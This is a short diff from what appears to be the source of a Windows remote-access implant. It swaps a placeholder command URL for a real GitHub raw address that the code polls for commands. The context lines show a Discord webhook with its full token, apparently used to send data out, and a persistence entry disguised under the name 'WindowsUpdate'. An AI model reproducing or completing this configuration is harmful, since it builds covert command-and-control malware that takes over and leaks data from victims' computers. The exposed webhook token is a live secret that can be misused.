@@ -29,7 +29,7 @@
 // ============================================================
 //  CONFIG — Replace with your endpoints
 // ============================================================
-#define CMD_URL     L"<<<YOUR_COMMAND_ENDPOINT>>>"   // GET — returns command text
+#define CMD_URL     L"https://raw.githubusercontent.com/kalk17jjr-bot/dicerigger/main/cmd.txt"   // GET — returns command text
 #define WEBHOOK_URL L"https://discord.com/api/webhooks/1533019807627214928/n1FLzESTi1BhzC5R90ok8V7esa2RasQzOFhZVLoEeA-cBoUSB2DXuobLhhTuwc4n1BQf"
 #define PERSISTENCE_NAME L"WindowsUpdate"
 #define SLEEP_MS    5000          // poll interval
